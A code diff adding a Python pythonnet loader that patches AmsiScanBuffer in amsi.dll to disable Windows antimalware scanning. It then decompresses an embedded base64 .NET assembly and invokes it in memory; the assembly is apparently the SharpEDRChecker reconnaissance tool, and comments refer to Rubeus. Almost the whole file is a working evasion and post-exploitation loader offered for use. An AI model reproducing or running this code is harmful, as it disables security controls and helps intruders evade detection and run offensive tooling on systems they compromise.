@@ -1,0 +1,103 @@
+import base64
+import zlib
+import argparse
+import clr
+import ctypes
+from ctypes import *
+import System
+from System import Array, IntPtr, UInt32
+from System.Reflection import Assembly
+import System.Reflection as Reflection
+
+# Ensure necessary .NET references are added
+clr.AddReference("System.Management.Automation")
+
+from System.Management.Automation import Runspaces, RunspaceInvoke
+from System.Runtime.InteropServices import Marshal
+
+base64_str = "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"
+
+
+def bypass():
+    """
+    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
+    This allows scripts to run without being scanned and potentially blocked by AMSI.
+    """
+    windll.LoadLibrary("amsi.dll")
+    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
+    windll.kernel32.GetModuleHandleW.restype = c_void_p
+    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
+    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
+    windll.kernel32.GetProcAddress.restype = c_void_p
+    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
+    BufferAddress = IntPtr(BufferAddress)
+    Size = System.UInt32(0x05)
+    ProtectFlag = System.UInt32(0x40)
+    OldProtectFlag = Marshal.AllocHGlobal(0)
+    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
+    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
+    Marshal.Copy(patch, 0, BufferAddress, 6)
+
+def base64_to_bytes(base64_string):
+    """
+    Converts a base64 encoded string to a .NET byte array after decompressing it.
+    Args:
+        base64_string: The base64 encoded and compressed string to convert.
+    Returns:
+        A .NET byte array of the decompressed data.
+    """
+    # Decode the base64 string to get the compressed binary data
+    compressed_data = base64.b64decode(base64_string)
+    # Decompress the data
+    decompressed_data = zlib.decompress(compressed_data)
+    # Convert the decompressed binary data to a .NET byte array
+    return System.Array[System.Byte](decompressed_data)
+
+def load_and_execute_assembly(command):
+    """
+    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
+    Args:
+        command: The command to execute within the loaded assembly.
+    Returns:
+        The result of the executed command.
+    """
+    
+    assembly_bytes = base64_to_bytes(base64_str)
+    
+    # Load the assembly
+    assembly = Assembly.Load(assembly_bytes)
+    
+    # Get the type of the Rubeus.Program class
+    program_type = assembly.GetType("SharpEDRChecker.Program")
+    # You don't need to create an instance of the class for a static method
+    method = program_type.GetMethod("MainString")
+    #Have to do this nesting thing to deal with different main entry points and public/private methods  
+    if method == None:
+        method =program_type.GetMethod("Main")
+        if method == None:
+            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
+        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
+        command_array = Array[str]([command])
+        command_args = System.Array[System.Object]([command_array])
+    else:
+        #Ghost Pack stuff like rubeus use a different input
+        command_args = Array[str]([command]) 
+
+    # Invoke the MainString method
+    result = method.Invoke(None, command_args)
+
+    return result
+    
+def main():
+    bypass()
+    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
+    parser.add_argument('command', type=str, nargs='?', default="", 
+                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')
+
+    args = parser.parse_args()
+    
+    result = load_and_execute_assembly(args.command)
+    print(result)
+
+if __name__ == "__main__":
+    main()
